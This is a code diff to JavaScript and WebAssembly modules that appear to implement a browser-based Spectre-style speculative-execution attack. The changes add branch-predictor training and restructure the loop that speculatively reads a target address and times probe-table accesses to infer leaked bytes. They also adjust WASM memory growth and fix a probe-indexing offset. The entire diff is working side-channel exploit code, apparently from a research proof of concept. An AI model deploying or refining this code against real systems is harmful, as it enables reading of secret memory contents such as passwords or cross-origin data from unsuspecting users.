@@ -4,6 +4,7 @@ import code_buffer from "../wasm-buffer.js";
 import IndicatorTable from "../indicator-table.js";
 
 let junk = 0;
+const training_number = 6;
 
 export default
 (async () => {
@@ -28,12 +29,22 @@ export default
                 if (need > 0) {
                     // console.log("malloc needs", Math.ceil(need / (1 << 16)), "pages");
                     try {
-                        wasm_memory.grow(Math.ceil(need / (1 << 16)));
-                        secret_table = new Uint8Array(wasm_memory.buffer, instance.exports.getSecretTableAddress(), 4 << 12);
+                        if (current_memory_position >> 16 >= 3e4) {
+                            current_memory_position = 1 << 25;
+                        } else {
+                            const result = wasm_memory.grow(Math.ceil(need / (1 << 16)));
+                            // console.log(result);
+                            // hard fault when allocating too much memory
+                            if (result == -1 || result >= 3e4) {
+                                current_memory_position = 1 << 25;
+                            } else {
+                                secret_table = new Uint8Array(wasm_memory.buffer, instance.exports.getSecretTableAddress(), 1 << 12);
+                            }
+                        }
                     } catch (error) {
                         // reached alloc limit -> reuse memory
-                        // console.log(wasm_memory.buffer.byteLength);
-                        current_memory_position = (4 << 12) * 2;
+                        console.log("alloc limit", wasm_memory.buffer.byteLength);
+                        current_memory_position = 1 << 25;
                     }
                 }
                 try {
@@ -74,46 +85,43 @@ export default
         const mean_times = [];
         const indicator_table = new IndicatorTable(probe_length);
         
-        let i = 0;
         let total_iterations = 0;
-        for (; i < min_iterations; ++total_iterations) {
-            _speculativelyReadAddress(address, speculative_repetitions, page_size, probe_length);
-            // process time tables
-            let high_mean_time;
-            for (const time_table of time_tables) {
-                const mean_time = indicator_table.processTimetable(time_table, max_cache_hit_number);
-                // lower limit check is done by indicator_table
-                if (mean_time) {
-                    mean_times.push(mean_time);
-                    high_mean_time = true;
-                } else {
-                    // console.warn("slow timer");
-                    continue;
+        for (var i = 0; i < min_iterations; ++total_iterations) {
+            if (!time_tables.length) {
+                _speculativelyReadAddress(address, speculative_repetitions, page_size, probe_length, training_number);
+            }
+            const time_table = time_tables.pop();
+            // process time table
+            const mean_time = indicator_table.processTimetable(time_table, max_cache_hit_number);
+            // lower limit check is done by indicator_table
+            if (mean_time) {
+                mean_times.push(mean_time);
+                // console.log(max_indicator_index, address);
+            } else {
+                // console.warn("slow timer");
+                if (total_iterations > min_iterations) {
+                    break;
                 }
-                // console.log(`%cprobe index time ${time_table[probe_index]}`, "font-size: .9em");
-                max_indicator = Math.max(...indicator_table);
-                let current_max_indicator_index = indicator_table.indexOf(max_indicator);
-                // check for multiple maxima
-                for (let i = current_max_indicator_index + 1; i < indicator_table.length; ++i) {
-                    if (max_indicator == indicator_table[i]) {
-                        current_max_indicator_index = undefined;
-                        break;
-                    }
-                }
-                // max_indicator_index changed
-                if (max_indicator_index != current_max_indicator_index) {
-                    i = (current_max_indicator_index !== undefined) | 0;
-                    max_indicator_index = current_max_indicator_index;
-                    // console.warn("max_indicator_index changed");
-                } else {
-                    ++i;
+                continue;
+            }
+            // console.log(`%cprobe index time ${time_table[probe_index]}`, "font-size: .9em");
+            max_indicator = Math.max(...indicator_table);
+            let current_max_indicator_index = indicator_table.indexOf(max_indicator);
+            // check for multiple maxima
+            for (let i = current_max_indicator_index + 1; i < indicator_table.length; ++i) {
+                if (max_indicator == indicator_table[i]) {
+                    current_max_indicator_index = undefined;
+                    break;
                 }
             }
-            if (total_iterations > min_iterations && !high_mean_time) {
-                break;
+            // max_indicator_index changed
+            if (max_indicator_index != current_max_indicator_index) {
+                i = (current_max_indicator_index !== undefined) | 0;
+                max_indicator_index = current_max_indicator_index;
+                // console.warn("max_indicator_index changed");
+            } else {
+                ++i;
             }
-
-            time_tables.length = 0;
         }
         const mean_time = mean(mean_times);
         if (i < min_iterations) {
@@ -139,7 +147,6 @@ export default
         };
     
         function probeTable(probe_table_address) {
-            instance;
             const time_table = new Uint32Array(probe_length);
             // const probe_table = new Uint8Array(probe_length * page_size);
             const probe_table = new Uint8Array(wasm_memory.buffer, probe_table_address, probe_length * page_size);
@@ -148,7 +155,7 @@ export default
             // probe table
             for (let i = 0; i < probe_length; ++i) {
                 timer.restore();
-                junk ^= probe_table[((i + random_offset) % 256 + 1) * page_size];
+                junk ^= probe_table[((i + random_offset) % 256) * page_size];
                 time_table[(i + random_offset) % 256] = timer.load();
             }
             time_tables.push(time_table);
